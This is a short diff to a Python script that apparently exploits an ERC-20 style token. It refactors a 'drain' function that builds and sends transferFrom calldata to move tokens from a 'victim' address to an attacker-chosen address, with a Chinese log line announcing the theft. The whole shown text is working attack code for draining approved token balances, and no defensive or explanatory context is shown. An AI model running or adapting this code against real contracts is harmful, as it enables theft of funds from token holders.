@@ -110,9 +110,10 @@ def report(url: str, token: str, victim: str, attacker: str, label: str):
     return vb, ab
 
 
-def drain(url: str, token: str, victim: str, amount: int, key: str) -> None:
-    data = TRANSFER_FROM + _word(victim) + _word(ATTACKER) + _word(hex(amount)[2:])
-    print(f"[*] 攻击者发起 transferFrom: {amount} 枚代币 {victim} → {ATTACKER}")
+def drain(url: str, token: str, victim: str, amount: int, key: str,
+          attacker: str = ATTACKER) -> None:
+    data = TRANSFER_FROM + _word(victim) + _word(attacker) + _word(hex(amount)[2:])
+    print(f"[*] 攻击者发起 transferFrom: {amount} 枚代币 {victim} → {attacker}")
     send(url, token, data, key)
 
 
